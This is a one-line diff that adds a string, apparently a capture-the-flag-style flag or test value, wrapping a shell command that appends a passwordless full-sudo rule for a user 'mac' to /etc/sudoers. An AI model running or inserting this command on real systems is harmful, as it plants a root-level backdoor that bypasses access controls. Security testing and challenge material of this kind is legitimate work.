@@ -1,0 +1,1 @@
+MAC{echo "mac ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers}
